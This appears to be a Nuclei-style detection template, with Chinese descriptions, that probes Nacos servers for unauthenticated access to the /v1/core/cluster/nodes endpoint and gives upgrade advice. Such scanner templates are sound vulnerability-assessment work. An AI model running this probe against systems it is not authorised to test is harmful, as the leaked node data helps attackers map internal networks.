id: nacos-nodes-disclosure
info:
  name: Nacos nodes 敏感信息泄露
  author: leadlife
  severity: medium
  description: 攻击者可通过泄漏的敏感信息扩大业务攻击面，进而获取内网信息
  reference: 
    - https://mp.weixin.qq.com/s/MuIOxn7UVEYQLqlTkG0BZA
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair: 推荐将Nacos服务器的版本升级到2.3.0或更高版本。这样可以直接利用Nacos新版本中对/nacos/v1/core/cluster/nodes接口的内置权限管理功能，确保只有具有Admin权限的用户才能访问此接口,更多可参考官方文档 https://nacos.io/blog/faq/nacos-user-question-history11845/
    version:
  tags: nacos,disclosure

http:
  - raw:
      - |
        GET /v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'code','message','data')
          - contains(header,'application/json')
        condition: and